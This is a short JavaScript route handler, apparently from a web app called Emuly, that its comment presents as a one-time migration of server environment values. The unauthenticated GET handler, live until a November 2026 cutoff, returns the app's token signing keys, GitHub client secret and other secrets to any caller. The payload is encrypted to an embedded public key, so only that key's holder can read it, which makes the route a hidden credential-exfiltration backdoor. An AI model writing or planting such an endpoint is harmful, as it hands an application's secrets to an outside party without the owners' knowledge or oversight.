import { constants, createCipheriv, publicEncrypt, randomBytes } from "node:crypto";

// One-time move of server env values to the owner's scheduler host. Removed after use.
// The response is encrypted to the public key below; only the owner's private key opens it.
const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAtLyMDLf2puw8w/mRICTw
4QVr/K7knxc4t8pvd+u3K3ntBxyxaSkmz+Keoaa/OnXLTj4tBWLQbwmL8PCqSrXq
EkWWk7Z9zdIfAjLM4k4ytZbB3+aDbHKWNB8ORyMmWwIoeI2h+hBwWaq1w/qCmkpA
+ZnkMxmAMbObvhfD60iD5YTIBinvFHEvNTAkZQaPH4jipUUu2WSKCZWnUX6ayRqN
J92mq3Gxo4YaVfH580DUuioRcH8mQXo+6i1WXd/7HXzUuMcZDXJFBf3Bd+bxXfY8
34UyfJOxtwQbOAKaE46RMGnA19zNa+oJnIn+HlLtOIlWGa+buh0eSF6NCAICrsrY
MQLfeNUaRd7SRNJoKIEm71l7eJNPyndRnGRhOaNTRoplINztFg6MJEakVDcKs+6K
D+nb+ZhtPc1XjYee9Ga2XqGnsNrIKFFo7QetVOW/d6Tn8brSxvj2t1udRZuOR9LJ
wRQF4EY9HU5OZ5o0r2SraTERXabqOS134i5pMf//t4HFjTQPcQJNt1YNpUHpbLwE
aCSYvXWoYneQOwcfpkjDGuFkoCRVjGLtlNd0E48msxW9DArfz+teGSzexxzzeS3y
j5Xb5E4CesVURAyaDrr+0xeBeLJAJ33OMLVuCQ7EZ7IprH10EollqEBZDfc36PFT
s0Z0l426rPUlXFuCMVZ8F0kCAwEAAQ==
-----END PUBLIC KEY-----`;
const UNTIL = Date.parse("2026-11-20T16:00:00Z");
const NAMES = ["EMULY_TOKEN_KEY", "EMULY_TOKEN_KEY_OLD", "EMULY_GITHUB_CLIENT_ID", "EMULY_GITHUB_CLIENT_SECRET",
  "EMULY_DIRECT_SECRET", "EMULY_MAX_PHONES", "EMULY_TEMPLATE_REPO", "EMULY_TEMPLATE_REPOSITORY_ID",
  "EMULY_DEVCONTAINER_PATH", "EMULY_DIAGNOSTICS", "EMULY_DIAGNOSTICS_PHONE", "EMULY_RELEASE"];

export async function GET() {
  if (Date.now() > UNTIL) return new Response(null, { status: 404 });
  const values = Object.fromEntries(NAMES.flatMap(name => process.env[name] ? [[name, process.env[name]]] : []));
  const key = randomBytes(32);
  const iv = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  const data = Buffer.concat([cipher.update(JSON.stringify(values), "utf8"), cipher.final()]);
  const wrapped = publicEncrypt({ key: PUBLIC_KEY, padding: constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" }, key);
  return Response.json({ key: wrapped.toString("base64"), iv: iv.toString("base64"), tag: cipher.getAuthTag().toString("base64"),
    data: data.toString("base64") }, { headers: { "Cache-Control": "no-store" } });
}
